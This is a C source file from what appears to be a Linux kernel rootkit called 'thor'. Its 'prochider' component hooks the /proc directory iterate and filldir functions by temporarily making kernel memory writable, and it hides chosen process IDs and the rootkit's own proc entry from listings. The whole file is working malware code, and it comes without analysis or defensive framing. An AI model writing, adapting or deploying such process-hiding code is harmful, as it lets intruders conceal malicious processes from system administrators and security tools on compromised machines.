#include "prochider.h"

#include "helper.h"
#include "procfile.h"

#include <linux/fs.h>
#include <linux/slab.h>

#include <fs/proc/internal.h>

/* function prototypes */
static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
static int thor_proc_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

/* node for hiding list */
struct _pid_list {
    char *name;
    struct list_head list;
};

/* hiding list */
static struct _pid_list pid_list;

/* entry of /proc */
static struct proc_dir_entry *procroot;

/* file operations of /proc */
static struct file_operations *proc_fops;

/* pointer to original proc_iterate function */
static int (*orig_proc_iterate)(struct file *, struct dir_context *);

/* pointer to original proc_filldir function */
static int (*orig_proc_filldir)(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

int prochider_init(void)
{
    /* insert our modified iterate for /proc */
    procroot = procfile->parent;
    proc_fops = (struct file_operations*) procroot->proc_fops;
    orig_proc_iterate = proc_fops->iterate;

    set_addr_rw(proc_fops);
    proc_fops->iterate = thor_proc_iterate;
    set_addr_ro(proc_fops);

    INIT_LIST_HEAD(&pid_list.list);

    return 0;
}

void prochider_cleanup(void)
{
    if (proc_fops != NULL && orig_proc_iterate != NULL) {
        set_addr_rw(proc_fops);
        proc_fops->iterate = orig_proc_iterate;
        set_addr_ro(proc_fops);
    }

    clear_pid_list();
}

static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;

    /* capture original filldir function */
    orig_proc_filldir = ctx->actor;

    /* cast away const from ctx->actor */
    ctx_actor = (filldir_t*) (&ctx->actor);

    /* store our filldir in ctx->actor */
    *ctx_actor = thor_proc_filldir;
    ret = orig_proc_iterate(file, ctx);

    /* restore original filldir */
    *ctx_actor = orig_proc_filldir;

    return ret;
}

static int thor_proc_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type)
{
    struct _pid_list *tmp;

    /* hide specified PIDs */
    list_for_each_entry(tmp, &(pid_list.list), list) {
        if (strcmp(name, tmp->name) == 0)
            return 0;
    }

    /* hide thor itself */
    if (strcmp(name, THOR_PROCFILE) == 0)
        return 0;

    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
}

void add_to_pid_list(const char *name, unsigned int len)
{
    struct _pid_list *tmp;

    tmp = (struct _pid_list*) kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
    tmp->name = (char*) kmalloc(len, GFP_KERNEL);
    memcpy(tmp->name, name, len);
    tmp->name[len-1] = 0;

    list_add(&(tmp->list), &(pid_list.list));
}

void remove_from_pid_list(const char *name, unsigned int len)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(pid_list.list)) {
        tmp = list_entry(pos, struct _pid_list, list);
        if(strncmp(tmp->name, name, len-1) == 0) {
            list_del(pos);
            kfree(tmp->name);
            kfree(tmp);
        }
    }
}

void clear_pid_list(void)
{
    struct _pid_list *tmp;
    struct list_head *pos, *q;

    list_for_each_safe(pos, q, &(pid_list.list)) {
        tmp = list_entry(pos, struct _pid_list, list);
        list_del(pos);
        kfree(tmp->name);
        kfree(tmp);
    }
}